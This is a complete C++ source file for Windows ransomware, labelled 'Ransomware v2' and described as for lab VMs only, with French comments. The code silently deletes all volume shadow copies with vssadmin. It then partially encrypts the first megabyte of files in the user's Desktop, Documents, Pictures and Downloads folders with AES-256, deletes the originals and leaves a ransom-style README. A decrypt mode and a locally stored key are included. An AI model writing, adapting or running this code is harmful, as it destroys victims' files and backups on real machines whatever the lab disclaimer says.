// language: C++17, file: lex_ransom2.cpp, target: Windows x64 (lab, VM uniquement)
// Ransomware v2 : suppression des shadow copies + chiffrement partiel + decrypt
// Modes:  (sans arg) = chiffrer | decrypt = restaurer
// TEST VM UNIQUEMENT
#include <windows.h>
#include <bcrypt.h>
#include <cstdio>
#include <string>
#include <vector>

#pragma comment(lib, "bcrypt.lib")
#define NT_OK(s) (((NTSTATUS)(s)) >= 0)
static const DWORD kMaxFile = 512 * 1024 * 1024;
static const DWORD kPartial  = 1024 * 1024;   // chiffre le premier Mo : vitesse maximale

static void KillShadows() {
    // vssadmin via cmd : la sauvegarde de volume ne devra pas servir
    STARTUPINFOA si{}; si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    CreateProcessA(NULL, (LPSTR)"cmd /c vssadmin delete shadows /all /quiet", NULL, NULL,
                   FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
}

static void Crypt(BYTE key[32], BYTE iv[16], const std::string& path, bool decrypt) {
    FILE* f = fopen(path.c_str(), "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    if (sz <= 0 || (DWORD)sz > kMaxFile) { fclose(f); return; }
    DWORD n = sz > (long)kPartial ? kPartial : (DWORD)sz;   // partiel : le debut seulement
    std::vector<BYTE> in(n), out(n + 16);
    fread(in.data(), 1, n, f); fclose(f);

    BCRYPT_ALG_HANDLE alg; BCRYPT_KEY_HANDLE hk;
    BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(alg, &hk, NULL, 0, key, 32, 0);
    ULONG done = 0;
    bool ok;
    if (decrypt)
        ok = NT_OK(BCryptDecrypt(hk, in.data(), n, NULL, iv, 16, out.data(),
                                 (ULONG)out.size(), &done, BCRYPT_BLOCK_PADDING));
    else
        ok = NT_OK(BCryptEncrypt(hk, in.data(), n, NULL, iv, 16, out.data(),
                                 (ULONG)out.size(), &done, BCRYPT_BLOCK_PADDING));
    BCryptDestroyKey(hk); BCryptCloseAlgorithmProvider(alg, 0);
    if (!ok) return;

    std::string dest = decrypt ? path.substr(0, path.size() - 7)
                               : path + ".lexcor";
    FILE* o = fopen(dest.c_str(), "wb");
    if (!o) return;
    fwrite(out.data(), 1, done, o);
    // la suite du fichier reste intacte (chiffrement partiel) - on la recopie
    if (!decrypt && sz > (long)kPartial) {
        f = fopen(path.c_str(), "rb"); fseek(f, kPartial, SEEK_SET);
        BYTE* rest = new BYTE[sz - kPartial];
        fread(rest, 1, sz - kPartial, f); fclose(f);
        fwrite(rest, 1, sz - kPartial, o);
        delete[] rest;
    }
    fclose(o);
    if (!decrypt) DeleteFileA(path.c_str());
}

static void Walk(const std::string& dir, BYTE key[32], BYTE iv[16], bool decrypt, int depth) {
    if (depth > 3) return;
    char mask[MAX_PATH]; snprintf(mask, sizeof(mask), "%s\\*.*", dir.c_str());
    WIN32_FIND_DATAA fd; HANDLE h = FindFirstFileA(mask, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        std::string name = fd.cFileName;
        if (name == "." || name == "..") continue;
        std::string full = dir + "\\" + name;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { Walk(full, key, iv, decrypt, depth+1); continue; }
        bool isEnc = name.size() > 7 && name.substr(name.size()-7) == ".lexcor";
        if (decrypt != isEnc) continue;
        Crypt(key, iv, full, decrypt);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

int main(int argc, char** argv) {
    bool decrypt = argc > 1 && strcmp(argv[1], "decrypt") == 0;
    char up[MAX_PATH]; GetEnvironmentVariableA("USERPROFILE", up, MAX_PATH);

    BYTE blob[48];
    std::string keyPath = std::string(up) + "\\lex_key.bin";
    if (decrypt) {
        FILE* f = fopen(keyPath.c_str(), "rb");
        if (!f) return 2;
        fread(blob, 1, 48, f); fclose(f);
    } else {
        BCryptGenRandom(NULL, blob, 48, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        FILE* f = fopen(keyPath.c_str(), "wb");
        if (f) { fwrite(blob, 1, 48, f); fclose(f); }
        KillShadows();
    }

    std::vector<std::string> roots = {
        std::string(up) + "\\Desktop", std::string(up) + "\\Documents",
        std::string(up) + "\\Pictures", std::string(up) + "\\Downloads"
    };
    BYTE iv[16]; memcpy(iv, blob + 32, 16);
    for (auto& r : roots) Walk(r, blob, iv, decrypt, 0);

    if (!decrypt) {
        FILE* f = fopen((std::string(up) + "\\Desktop\\README_LEX.txt").c_str(), "w");
        if (f) {
            fprintf(f, "LEXCORP INDUSTRIES - VOS FICHIERS SONT SOUS PROTECTION LEX\n\n"
                       "Chiffrement AES-256-CBC partiel. Extension: .lexcor\n"
                       "Cle locale (demo): lex_key.bin\n"
                       "Restauration: lancez le binaire avec 'decrypt'\n");
            fclose(f);
        }
    } else
        DeleteFileA(keyPath.c_str());
    return 0;
}
